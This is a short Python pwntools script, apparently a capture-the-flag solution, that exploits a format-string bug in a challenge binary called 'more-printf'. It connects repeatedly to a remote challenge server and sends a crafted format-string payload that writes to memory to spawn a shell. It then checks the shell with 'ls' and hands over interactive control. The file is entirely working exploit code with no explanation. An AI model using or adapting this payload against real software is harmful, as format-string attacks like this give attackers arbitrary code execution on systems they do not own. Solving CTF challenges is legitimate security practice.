from pwn import *

elf = ELF("more-printf")
libc = ELF("libc.so.6")
ld = ELF("ld-2.27.so")

context.binary = elf

#target = process([elf.path, ld.path], env={"LD_PRELOAD": libc.path})

while True:
	target = remote("pwn.zh3r0.cf", 2222)

	target.sendline("%c%c%c%5c%hhn%186326c%*8$d%5$n")
	
	try:
		target.sendline("ls")
		print(target.recvline())

		target.interactive()
		break


	except:
		target.close()